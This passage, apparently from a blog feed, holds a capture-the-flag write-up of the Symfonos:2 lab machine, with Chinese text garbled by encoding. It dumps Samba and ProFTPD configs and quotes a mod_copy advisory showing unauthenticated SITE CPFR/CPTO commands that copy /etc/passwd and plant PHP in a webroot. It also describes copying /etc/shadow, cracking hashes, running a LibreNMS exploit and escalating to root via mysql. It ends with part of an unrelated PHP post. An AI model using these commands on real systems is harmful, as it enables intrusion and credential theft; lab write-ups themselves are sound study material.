class="keyword">if</span> your Samba machine is</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> not protected by a firewall or is a firewall itself.  However, this</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> option cannot handle dynamic or non-broadcast interfaces correctly.</span></span><br><span class="line">;   bind interfaces only = yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### Debugging/Accounting ####</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This tells Samba to use a separate <span class="built_in">log</span> file <span class="keyword">for</span> each machine</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> that connects</span></span><br><span class="line">   log file = /var/log/samba/log.%m</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Cap the size of the individual <span class="built_in">log</span> files (<span class="keyword">in</span> KiB).</span></span><br><span class="line">   max log size = 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want Samba to only <span class="built_in">log</span> through syslog <span class="keyword">then</span> <span class="built_in">set</span> the following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> parameter to <span class="string">&#x27;yes&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   syslog only = no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> We want Samba to <span class="built_in">log</span> a minimum amount of information to syslog. Everything</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> should go to /var/<span class="built_in">log</span>/samba/<span class="built_in">log</span>.&#123;smbd,nmbd&#125; instead. If you want to <span class="built_in">log</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> through syslog you should <span class="built_in">set</span> the following parameter to something higher.</span></span><br><span class="line">   syslog = 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Do something sensible when Samba crashes: mail the admin a backtrace</span></span><br><span class="line">   panic action = /usr/share/samba/panic-action %d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###### Authentication #######</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Server role. Defines <span class="keyword">in</span> <span class="built_in">which</span> mode Samba will operate. Possible</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> values are <span class="string">&quot;standalone server&quot;</span>, <span class="string">&quot;member server&quot;</span>, <span class="string">&quot;classic primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> domain controller<span class="string">&quot;, &quot;</span>classic backup domain controller<span class="string">&quot;, &quot;</span>active</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory domain controller<span class="string">&quot;.</span></span> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Most people will want &quot;standalone sever&quot; or &quot;member server&quot;.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Running as <span class="string">&quot;active directory domain controller&quot;</span> will require first</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> running <span class="string">&quot;samba-tool domain provision&quot;</span> to wipe databases and create a</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> new domain.</span></span><br><span class="line">   server role = standalone server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you are using encrypted passwords, Samba will need to know what</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password database <span class="built_in">type</span> you are using.</span>  </span><br><span class="line">   passdb backend = tdbsam</span><br><span class="line"></span><br><span class="line">   obey pam restrictions = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This boolean parameter controls whether Samba attempts to sync the Unix</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password with the SMB password when the encrypted SMB password <span class="keyword">in</span> the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> passdb is changed.</span></span><br><span class="line">   unix password sync = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For Unix password sync to work on a Debian GNU/Linux system, the following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> parameters must be <span class="built_in">set</span> (thanks to Ian Kahan &lt;&lt;<span class="string">kahan@informatik.tu-muenchen.de&gt; for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sending the correct chat script <span class="keyword">for</span> the passwd program <span class="keyword">in</span> Debian Sarge).</span></span><br><span class="line">   passwd program = /usr/bin/passwd %u</span><br><span class="line">   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This boolean controls whether PAM will be used <span class="keyword">for</span> password changes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> when requested by an SMB client instead of the program listed <span class="keyword">in</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;passwd program&#x27;</span>. The default is <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line">   pam password change = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This option controls how unsuccessful authentication attempts are mapped</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to anonymous connections</span></span><br><span class="line">   map to guest = bad user</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######### Domains ###########</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># The following settings only takes effect if &#x27;server role = primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> classic domain controller<span class="string">&#x27;, &#x27;</span>server role = backup domain controller<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="bash"><span class="comment"># It specifies the location of the user&#x27;s</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> profile directory from the client point of view) The following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> required a [profiles] share to be setup on the samba server (see</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> below)</span></span><br><span class="line">;   logon path = \\%N\profiles\%U</span><br><span class="line"><span class="meta">#</span><span class="bash"> Another common choice is storing the profile <span class="keyword">in</span> the user<span class="string">&#x27;s home directory</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (this is Samba<span class="string">&#x27;s default)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   logon path = \\%N\%U\profile</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following setting only takes effect <span class="keyword">if</span> <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It specifies the location of a user<span class="string">&#x27;s home directory (from the client</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> point of view)</span></span><br><span class="line">;   logon drive = H:</span><br><span class="line"><span class="meta">#</span><span class="bash">   logon home = \\%N\%U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following setting only takes effect <span class="keyword">if</span> <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It specifies the script to run during logon. The script must be stored</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> the [netlogon] share</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> NOTE: Must be store <span class="keyword">in</span> <span class="string">&#x27;DOS&#x27;</span> file format convention</span></span><br><span class="line">;   logon script = logon.cmd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows Unix users to be created on the domain controller via the SAMR</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC pipe.  The example <span class="built_in">command</span> creates a user account with a disabled Unix</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password; please adapt to your needs</span></span><br><span class="line">; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos &quot;&quot; %u</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows machine accounts to be created on the domain controller via the</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> SAMR RPC pipe.</span>  </span><br><span class="line"><span class="meta">#</span><span class="bash"> The following assumes a <span class="string">&quot;machines&quot;</span> group exists on the system</span></span><br><span class="line">; add machine script  = /usr/sbin/useradd -g machines -c &quot;%u machine account&quot; -d /var/lib/samba -s /bin/false %u</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows Unix groups to be created on the domain controller via the SAMR</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC pipe.</span>  </span><br><span class="line">; add group script = /usr/sbin/addgroup --force-badname %g</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">########### Misc ############</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Using the following line enables you to customise your configuration</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> on a per machine basis. The %m gets replaced with the netbios name</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> of the machine that is connecting</span></span><br><span class="line">;   include = /home/samba/etc/smb.conf.%m</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Some defaults <span class="keyword">for</span> winbind (make sure you<span class="string">&#x27;re not using the ranges</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> something <span class="keyword">else</span>.)</span></span><br><span class="line">;   idmap uid = 10000-20000</span><br><span class="line">;   idmap gid = 10000-20000</span><br><span class="line">;   template shell = /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Setup usershare options to <span class="built_in">enable</span> non-root users to share folders</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> with the net usershare <span class="built_in">command</span>.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Maximum number of usershare. 0 (default) means that usershare is disabled.</span></span><br><span class="line">;   usershare max shares = 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow users who<span class="string">&#x27;ve been granted usershare privileges to create</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> public shares, not just authenticated ones</span></span><br><span class="line">   usershare allow guests = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">======================= Share Definitions =======================</span></span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">   comment = Home Directories</span><br><span class="line">   browseable = no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> By default, the home directories are exported read-only. Change the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> next parameter to <span class="string">&#x27;no&#x27;</span> <span class="keyword">if</span> you want to be able to write to them.</span></span><br><span class="line">   read only = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> File creation mask is <span class="built_in">set</span> to 0700 <span class="keyword">for</span> security reasons. If you want to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> create files with group=rw permissions, <span class="built_in">set</span> next parameter to 0775.</span></span><br><span class="line">   create mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Directory creation mask is <span class="built_in">set</span> to 0700 <span class="keyword">for</span> security reasons. If you want to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> create <span class="built_in">dirs</span>. with group=rw permissions, <span class="built_in">set</span> next parameter to 0775.</span></span><br><span class="line">   directory mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> By default, \\server\username shares can be connected to by anyone</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> with access to the samba server.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following parameter makes sure that only <span class="string">&quot;username&quot;</span> can connect</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to \\server\username</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This might need tweaking when using external authentication schemes</span></span><br><span class="line">   valid users = %S</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Un-comment the following and create the netlogon directory <span class="keyword">for</span> Domain Logons</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (you need to configure Samba to act as a domain controller too.)</span></span><br><span class="line">;[netlogon]</span><br><span class="line">;   comment = Network Logon Service</span><br><span class="line">;   path = /home/samba/netlogon</span><br><span class="line">;   guest ok = yes</span><br><span class="line">;   read only = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Un-comment the following and create the profiles directory to store</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> users profiles (see the <span class="string">&quot;logon path&quot;</span> option above)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (you need to configure Samba to act as a domain controller too.)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The path below should be writable by all users so that their</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> profile directory may be created the first time they <span class="built_in">log</span> on</span></span><br><span class="line">;[profiles]</span><br><span class="line">;   comment = Users profiles</span><br><span class="line">;   path = /home/samba/profiles</span><br><span class="line">;   guest ok = no</span><br><span class="line">;   browseable = no</span><br><span class="line">;   create mask = 0600</span><br><span class="line">;   directory mask = 0700</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">   comment = All Printers</span><br><span class="line">   browseable = no</span><br><span class="line">   path = /var/spool/samba</span><br><span class="line">   printable = yes</span><br><span class="line">   guest ok = no</span><br><span class="line">   read only = yes</span><br><span class="line">   create mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows clients look <span class="keyword">for</span> this share name as a <span class="built_in">source</span> of downloadable</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> printer drivers</span></span><br><span class="line"><span class="meta">[print$</span><span class="bash">]</span></span><br><span class="line">   comment = Printer Drivers</span><br><span class="line">   path = /var/lib/samba/printers</span><br><span class="line">   browseable = yes</span><br><span class="line">   read only = yes</span><br><span class="line">   guest ok = no</span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment to allow remote administration of Windows <span class="built_in">print</span> drivers.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may need to replace <span class="string">&#x27;lpadmin&#x27;</span> with the name of the group your</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> admin users are members of.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Please note that you also need to <span class="built_in">set</span> appropriate Unix permissions</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the drivers directory <span class="keyword">for</span> these users to have write rights <span class="keyword">in</span> it</span></span><br><span class="line">;   write list = root, @lpadmin</span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">   path = /home/aeolus/share</span><br><span class="line">   browseable = yes</span><br><span class="line">   read only = yes</span><br><span class="line">   guest ok = yes</span><br><span class="line"></span><br><span class="line">root@symfonos2:~# cat /usr/local/etc/proftpd.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> This is a basic ProFTPD configuration file (rename it to</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;proftpd.conf&#x27;</span> <span class="keyword">for</span> actual use.  It establishes a single server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and a single anonymous login.  It assumes that you have a user/group</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;nobody&quot;</span> and <span class="string">&quot;ftp&quot;</span> <span class="keyword">for</span> normal operation and anon.</span></span><br><span class="line"></span><br><span class="line">ServerName&quot;ProFTPD Default Installation&quot;</span><br><span class="line">ServerTypestandalone</span><br><span class="line">DefaultServeron</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Port 21 is the standard FTP port.</span></span><br><span class="line">Port21</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t use IPv6 support by default.</span></span></span><br><span class="line">UseIPv6off</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Umask 022 is a good standard <span class="built_in">umask</span> to prevent new <span class="built_in">dirs</span> and files</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> from being group and world writable.</span></span><br><span class="line">Umask022</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To prevent DoS attacks, <span class="built_in">set</span> the maximum number of child processes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to 30.  If you need to allow more than 30 concurrent connections</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> at once, simply increase this value.  Note that this ONLY works</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> standalone mode, <span class="keyword">in</span> inetd mode you should use an inetd server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> that allows you to <span class="built_in">limit</span> maximum number of processes per service</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (such as xinetd).</span></span><br><span class="line">MaxInstances30</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set the user and group under <span class="built_in">which</span> the server will run.</span></span><br><span class="line">Useraeolus</span><br><span class="line">Groupaeolus</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To cause every FTP user to be <span class="string">&quot;jailed&quot;</span> (chrooted) into their home</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory, uncomment this line.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DefaultRoot ~</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Normally, we want files to be overwriteable.</span></span><br><span class="line">AllowOverwriteon</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Bar use of SITE CHMOD by default</span></span><br><span class="line">&lt;Limit SITE_CHMOD&gt;</span><br><span class="line">  DenyAll</span><br><span class="line">&lt;/Limit&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> A basic anonymous configuration, no upload directories.  If you <span class="keyword">do</span> not</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> want anonymous users, simply delete this entire &lt;Anonymous&gt; section.</span></span><br><span class="line">&lt;Anonymous ~ftp&gt;</span><br><span class="line">  Userftp</span><br><span class="line">  Groupftp</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> We want clients to be able to login with <span class="string">&quot;anonymous&quot;</span> as well as <span class="string">&quot;ftp&quot;</span></span></span><br><span class="line">  UserAliasanonymous ftp</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Limit the maximum number of anonymous logins</span></span><br><span class="line">  MaxClients10</span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> We want <span class="string">&#x27;welcome.msg&#x27;</span> displayed at login, and <span class="string">&#x27;.message&#x27;</span> displayed</span></span><br><span class="line"><span class="meta">  #</span><span class="bash"> <span class="keyword">in</span> each newly chdired directory.</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">DisplayLoginwelcome.msg</span></span><br><span class="line"><span class="meta">  #</span><span class="bash">DisplayChdir.message</span></span><br><span class="line"></span><br><span class="line"><span class="meta">  #</span><span class="bash"> Limit WRITE everywhere <span class="keyword">in</span> the anonymous chroot</span></span><br><span class="line">  &lt;Limit WRITE&gt;</span><br><span class="line">    DenyAll</span><br><span class="line">  &lt;/Limit&gt;</span><br><span class="line">&lt;/Anonymous&gt;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†å…±äº«æ–‡ä»¶çš„ç›®å½•ä¸º<code>/home/aeolus/share</code>ä»¥åŠç”¨æˆ·å<code>aeolus</code></p><h2 id="ftp"><a href="#ftp" class="headerlink" title="ftp"></a>ftp</h2><p>ä¸Šé¢çš„ç»“æœå¯ä»¥çœ‹åˆ°<code>ftp</code>ä½¿ç”¨äº†<code>Proftpd 1.3.5</code></p><p>æŸ¥æ‰¾ä¸€ä¸‹æ¼æ´</p><img src="symfonos:2/image-20200808145305403.png" alt="image-20200808145305403" style="zoom:50%;" /><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Description TJ Saunders 2015-04-07 16:35:03 UTC</span><br><span class="line">Vadim Melihow reported a critical issue with proftpd installations that use the</span><br><span class="line">mod_copy module&#x27;s SITE CPFR/SITE CPTO commands; mod_copy allows these commands</span><br><span class="line">to be used by *unauthenticated clients*:</span><br><span class="line"></span><br><span class="line">---------------------------------</span><br><span class="line">Trying 80.150.216.115...</span><br><span class="line">Connected to 80.150.216.115.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">220 ProFTPD 1.3.5rc3 Server (Debian) [::ffff:80.150.216.115]</span><br><span class="line">site help</span><br><span class="line">214-The following SITE commands are recognized (* =&gt;&#x27;s unimplemented)</span><br><span class="line">214-CPFR &lt;sp&gt; pathname</span><br><span class="line">214-CPTO &lt;sp&gt; pathname</span><br><span class="line">214-UTIME &lt;sp&gt; YYYYMMDDhhmm[ss] &lt;sp&gt; path</span><br><span class="line">214-SYMLINK &lt;sp&gt; source &lt;sp&gt; destination</span><br><span class="line">214-RMDIR &lt;sp&gt; path</span><br><span class="line">214-MKDIR &lt;sp&gt; path</span><br><span class="line">214-The following SITE extensions are recognized:</span><br><span class="line">214-RATIO -- show all ratios in effect</span><br><span class="line">214-QUOTA</span><br><span class="line">214-HELP</span><br><span class="line">214-CHGRP</span><br><span class="line">214-CHMOD</span><br><span class="line">214 Direct comments to root@www01a</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /tmp/passwd.copy</span><br><span class="line">250 Copy successful</span><br><span class="line">-----------------------------------------</span><br><span class="line"></span><br><span class="line">He provides another, scarier example:</span><br><span class="line"></span><br><span class="line">------------------------------</span><br><span class="line">site cpfr /etc/passwd</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto &lt;?php phpinfo(); ?&gt;</span><br><span class="line">550 cpto: Permission denied</span><br><span class="line">site cpfr /proc/self/fd/3</span><br><span class="line">350 File or directory exists, ready for destination name</span><br><span class="line">site cpto /var/www/test.php</span><br><span class="line"></span><br><span class="line">test.php now contains</span><br><span class="line">----------------------</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error rewinding scoreboard: Invalid argument</span><br><span class="line">2015-04-04 02:01:13,159 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): FTP session opened.</span><br><span class="line">2015-04-04 02:01:27,943 slon-P5Q proftpd[16255] slon-P5Q</span><br><span class="line">(slon-P5Q.lan[192.168.3.193]): error opening destination file &#x27;/&lt;?php</span><br><span class="line">phpinfo(); ?&gt;&#x27; for copying: Permission denied</span><br><span class="line">-----------------------</span><br><span class="line"></span><br><span class="line">test.php contains contain correct php script &quot;&lt;?php phpinfo(); ?&gt;&quot; which</span><br><span class="line">can be run by the php interpreter</span><br><span class="line"></span><br><span class="line">Source: http://bugs.proftpd.org/show_bug.cgi?id=4169</span><br></pre></td></tr></table></figure><p>æ‹·è´ä»»æ„æ–‡ä»¶</p><p>æ ¹æ®è¿™ä¸ªï¼Œæ‹·è´<code>/etc/shadow</code>å’Œ<code>/etc/passwd</code>åˆ°<code>/home/aeolus/share/</code>ç›®å½•ä¸‹ï¼Œå¹¶ä¸”é€šè¿‡smbå¯ä»¥ä¸‹è½½åˆ°æœ¬åœ°</p><p>å¯¹é‡Œé¢çš„hashå€¼ä½¿ç”¨johnç ´è§£ï¼Œå¾—åˆ°äº†ä¸€ä¸ªå¯†ç </p><img src="symfonos:2/image-20200808145719194.png" alt="image-20200808145719194" style="zoom:50%;" /><p>ä½¿ç”¨sshè¿æ¥ä¸Šå»</p><h2 id="ç«¯å£è½¬å‘"><a href="#ç«¯å£è½¬å‘" class="headerlink" title="ç«¯å£è½¬å‘"></a>ç«¯å£è½¬å‘</h2><p>ï¼ˆç¿»å‚è€ƒç­”æ¡ˆï¼‰</p><p>é‡Œé¢å®‰è£…äº†<code>nmap</code>è½¯ä»¶ï¼Œæ‰€ä»¥<code>nmap localhost</code></p><img src="symfonos:2/image-20200808145945366.png" alt="image-20200808145945366" style="zoom:50%;" /><p>å‘ç°å¼€å¯äº†<code>8080</code>ç«¯å£</p><p>ä½¿ç”¨msfçš„sshè½¬å‘æ¨¡å—â€”â€”<code>portfwd</code></p><img src="symfonos:2/image-20200808150333164.png" alt="image-20200808150333164" style="zoom:50%;" /><img src="symfonos:2/image-20200808150502696.png" alt="image-20200808150502696" style="zoom:50%;" /><p>è®¿é—®<code>http://127.0.0.1:8848</code>å³å¯</p><h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><p>è®¿é—®ä¹‹åå‘ç°æ˜¯ä¸€ä¸ª<code>librenms</code></p><img src="symfonos:2/image-20200808150554104.png" alt="image-20200808150554104" style="zoom:50%;" /><p>æŸ¥çœ‹ä¸€ä¸‹exp</p><img src="symfonos:2/image-20200808150649713.png" alt="image-20200808150649713" style="zoom:50%;" /><p>ä½¿ç”¨ç¬¬ä¸€ä¸ªexp</p><p>å¡«ä¸Šå‚æ•°ä¹‹åæ”»å‡»æˆåŠŸ</p><img src="symfonos:2/image-20200808150856911.png" alt="image-20200808150856911" style="zoom:50%;" /><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><img src="symfonos:2/image-20200808150953085.png" alt="image-20200808150953085" style="zoom:50%;" /><p>å¯ä»¥ä»¥rootæƒé™ä½¿ç”¨<code>mysql</code></p><p>åˆ°<a href="https://gtfobins.github.io/">è¿™ä¸ªç½‘ç«™</a>æŸ¥ä¸€ä¸‹mysqlçš„ææƒæ–¹æ³•</p><img src="symfonos:2/image-20200808151108090.png" alt="image-20200808151108090" style="zoom:50%;" /><p>è¿è¡Œåææƒåˆ°äº†<code>root</code></p><img src="symfonos:2/image-20200808151152528.png" alt="image-20200808151152528" style="zoom:50%;" /><img src="symfonos:2/image-20200808151240146.png" alt="image-20200808151240146" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> symfonos </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpä¸­çš„ç³»ç»Ÿå¸¸é‡</title>
      <link href="/php_systemVar.html"/>
      <url>/php_systemVar.html</url>
      
        <content type="html"><![CDATA[<p>phpä¸­çš„å¸¸é‡</p><p>å‚è§<a href="https://www.php.net/manual/zh/reserved.variables.php">phpæ‰‹å†Œ</a></p><a id="more"></a><h3 id="ç³»ç»Ÿå¸¸é‡"><a href="#ç³»ç»Ÿå¸¸é‡" class="headerlink" title="ç³»ç»Ÿå¸¸é‡"></a>ç³»ç»Ÿå¸¸é‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP_VERSION:<span class="comment">// phpçš„ç‰ˆæœ¬å·</span></span><br><span class="line">PHP_INT_SIZE:<span class="comment">// æ•´å‹çš„å¤§å°</span></span><br><span class="line">PHP_INT_MAX:<span class="comment">// æ•´å‹èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼</span></span><br><span class="line">PHP_OS <span class="comment">// å½“å‰PHPç¯å¢ƒçš„è¿è¡Œæ“ä½œç³»ç»Ÿ</span></span><br><span class="line">M_PI <span class="comment">// åœ†å‘¨ç‡å¸¸é‡å€¼</span></span><br><span class="line">M_E <span class="comment">// ç§‘å­¦å¸¸æ•°e</span></span><br><span class="line">E_ERROR <span class="comment">// æœ€è¿‘çš„é”™è¯¯ä¹‹å¤„</span></span><br><span class="line">E_WARNING <span class="comment">// æœ€è¿‘çš„è­¦å‘Šä¹‹å¤„</span></span><br><span class="line">E_PARSE <span class="comment">// å‰–æè¯­æ³•æœ‰æ½œåœ¨é—®é¢˜ä¹‹å¤„</span></span><br></pre></td></tr></table></figure><h3 id="é­”æœ¯å¸¸é‡"><a href="#é­”æœ¯å¸¸é‡" class="headerlink" 